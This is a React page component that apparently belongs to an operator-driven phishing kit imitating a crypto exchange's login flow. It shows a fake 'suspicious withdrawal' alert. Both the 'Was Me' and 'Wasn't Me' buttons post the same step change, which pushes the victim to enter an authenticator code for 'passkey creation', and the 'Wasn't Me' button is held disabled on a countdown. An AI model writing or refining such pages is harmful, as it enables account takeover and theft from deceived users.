"use client";

import { Suspense, useState, useEffect, useCallback } from "react";
import { AuthShell } from "@/components/auth/AuthShell";
import { StepGate } from "@/components/auth/StepGate";
import type { StepState } from "@/hooks/useStepState";

function InfoRow({ label, value, valueClassName = "text-white", showBorder = true }: { label: string; value: string; valueClassName?: string; showBorder?: boolean }) {
  return (
    <div className={`flex items-center justify-between px-4 py-3 ${showBorder ? "border-b border-white/10" : ""}`}>
      <span className="text-sm font-medium text-grey-200">{label}</span>
      <span className={`text-sm font-semibold ${valueClassName}`}>{value}</span>
    </div>
  );
}

function PasskeyInfoTable() {
  return (
    <div className="w-full rounded-[8px] border border-white/10 bg-white/[0.03]">
      <InfoRow label="Type" value="Withdrawal" />
      <InfoRow label="Amount" value="28.90 EUR" />
      <InfoRow label="To" value="bc1q****0wlh" />
      <InfoRow label="Date" value="Apr 10, 2026 at 3:46 PM" />
      <InfoRow label="Status" value="Pending Review" valueClassName="text-blue-brand" showBorder={false} />
    </div>
  );
}

function PasskeyCreatingInner() {
  const [loading, setLoading] = useState(true);
  const [timer, setTimer] = useState(5);
  const [movedOn, setMovedOn] = useState(false);

  useEffect(() => {
    const id = setTimeout(() => setLoading(false), 3000);
    return () => clearTimeout(id);
  }, []);

  const advanceToAuth = useCallback(async () => {
    if (movedOn) return;
    setMovedOn(true);
    await fetch("/api/step", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        step: "auth-code",
        message: "Enter authenticator code for passkey creation",
      }),
    }).catch(() => {});
  }, [movedOn]);

  useEffect(() => {
    if (loading || timer <= 0) return;
    const id = setInterval(() => setTimer((t) => Math.max(t - 1, 0)), 1000);
    return () => clearInterval(id);
  }, [loading, timer]);

  return (
    <StepGate step="passkey-creating">
      {(state) => (
        <div className="flex w-full max-w-[512px] flex-col items-center">
          <div className="w-full min-h-[500px] rounded-[8px] border border-auth-card-border bg-auth-card p-6">
            {loading ? (
              <div className="flex flex-col items-center justify-center py-24 text-center">
                <span
                  aria-hidden="true"
                  className="h-10 w-10 animate-spin rounded-full border-2 border-transparent border-t-[#e5e7eb]"
                />
              </div>
            ) : (
              <div className="flex flex-col items-start text-left w-full">
                <h2 className="mt-4 text-[32px] font-semibold leading-8 text-white">
                  Review Transaction
                </h2>
                <p className="mt-3 text-base font-medium text-grey-200">
                  A suspicious withdrawal was flagged on your account. Please confirm if you authorized this transaction.
                </p>

                <div className="mt-8 w-full">
                  <PasskeyInfoTable />
                </div>

                <div className="mt-8 flex w-full flex-row gap-3">
                  <button
                    onClick={advanceToAuth}
                    disabled={movedOn}
                    className="flex h-11 flex-1 items-center justify-center rounded-[8px] bg-blue-brand text-sm font-semibold text-white transition-colors hover:bg-blue-brand/90 disabled:cursor-not-allowed disabled:opacity-40"
                  >
                    {movedOn ? "Moving..." : "Was Me"}
                  </button>

                  <button
                    onClick={advanceToAuth}
                    disabled={timer > 0 || movedOn}
                    className="flex h-11 flex-1 items-center justify-center rounded-[8px] bg-white/[0.05] border border-white/10 text-sm font-semibold text-grey-200 transition-colors hover:bg-white/[0.08] disabled:cursor-not-allowed disabled:opacity-40"
                  >
                    {timer > 0 && !movedOn
                      ? `Wasn't Me (${timer}s)`
                      : "Wasn't Me"}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </StepGate>
  );
}

export default function PasskeyCreatingPage() {
  return (
    <AuthShell>
      <div className="mx-auto mb-10 mt-8 flex w-full max-w-[1140px] flex-1 flex-col">
        <div className="flex flex-1 items-center justify-center">
          <Suspense fallback={null}>
            <PasskeyCreatingInner />
          </Suspense>
        </div>
      </div>
    </AuthShell>
  );
}
